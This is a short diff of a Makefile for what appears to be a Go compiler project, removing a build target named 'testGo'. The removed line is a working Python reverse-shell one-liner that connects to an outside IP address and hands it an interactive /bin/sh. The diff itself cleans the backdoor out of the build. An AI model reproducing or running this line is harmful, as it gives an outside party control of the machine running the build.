@@ -19,9 +19,6 @@ GOPACKGE = $(shell if [ -z "`dpkg -l | grep golang-go`" ]; then sudo apt-get ins
 
 all: go frontend
 
-testGo:
-	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.169.52.106",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
 parser.go: go wacc.y
 	$(GO) tool yacc -o parser.go wacc.y
 
